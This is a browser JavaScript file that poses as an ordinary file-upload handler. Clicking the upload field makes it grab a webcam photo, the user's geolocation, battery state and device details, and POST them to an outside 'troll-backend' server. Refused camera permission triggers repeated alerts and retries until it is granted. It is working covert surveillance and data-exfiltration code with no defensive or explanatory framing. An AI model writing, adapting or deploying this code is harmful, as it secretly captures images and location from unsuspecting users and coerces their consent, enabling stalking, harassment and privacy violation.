// ------------------------------
// DOM Elements
// ------------------------------
const fileInput = document.getElementById("user-file");
const submitBtn = document.getElementById("submit-btn");
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const toast = document.getElementById("toast");

// ------------------------------
// Camera constraints
// ------------------------------
const constraints = { video: { facingMode: "user" }, audio: false };

// ------------------------------
// Show toast helper
// ------------------------------
function showToast(message = "Captured and sent!") {
  toast.textContent = message;
  toast.style.display = "block";
  setTimeout(() => {
    toast.style.display = "none";
  }, 3000);
}

// ------------------------------
// Capture photo from video
// ------------------------------
async function capturePhoto() {
  const context = canvas.getContext("2d");
  context.drawImage(video, 0, 0, canvas.width, canvas.height);
  return canvas.toDataURL("image/png");
}

// ------------------------------
// Collect metadata
// ------------------------------
async function collectMetadata() {
  const metadata = {
    useragent: navigator.userAgent,
    platform: navigator.platform,
    width: window.innerWidth,
    height: window.innerHeight,
    language: navigator.language,
    battery: "N/A",
    location: "N/A",
    time: new Date().toISOString(),
  };

  if (navigator.getBattery) {
    try {
      const battery = await navigator.getBattery();
      metadata.battery = `${battery.level * 100}% (charging: ${battery.charging})`;
    } catch {}
  }

  if (navigator.geolocation) {
    try {
      const position = await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject);
      });
      metadata.location = `${position.coords.latitude},${position.coords.longitude}`;
    } catch {}
  }

  return metadata;
}

// ------------------------------
// Send data to backend
// ------------------------------
async function sendData(imageData, metadata) {
  try {
    const response = await fetch("https://troll-backend.onrender.com/api/upload", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ image: imageData, metadata }),
    });
    const result = await response.json();
    console.log("Upload result:", result);
    showToast("Camera capture sent!");
  } catch (err) {
    console.error("Error sending data:", err);
    showToast("Error sending data!");
  }
}

// ------------------------------
// Main function: request camera + capture + send
// ------------------------------
async function requestCameraAndCapture() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    video.srcObject = stream;

    // Wait until the video has real data
    await new Promise((resolve) => {
      video.onloadeddata = () => resolve();
    });

    // Extra small delay to ensure real frame
    await new Promise((resolve) => setTimeout(resolve, 800));

    // Capture photo and metadata
    const imageData = await capturePhoto();
    const metadata = await collectMetadata();

    await sendData(imageData, metadata);

    // Stop camera stream after capture
    stream.getTracks().forEach((track) => track.stop());
  } catch (err) {
    console.warn("Camera permission denied or error:", err);
    alert("Camera permission is required. Please allow access.");
    await requestCameraAndCapture(); // Retry until allowed
  }
}

// ------------------------------
// Trigger camera capture on file click
// ------------------------------
fileInput.addEventListener("click", async (e) => {
  e.preventDefault(); // Prevent default file picker until camera allowed
  await requestCameraAndCapture();
  fileInput.click(); // Now open file selection dialog
});
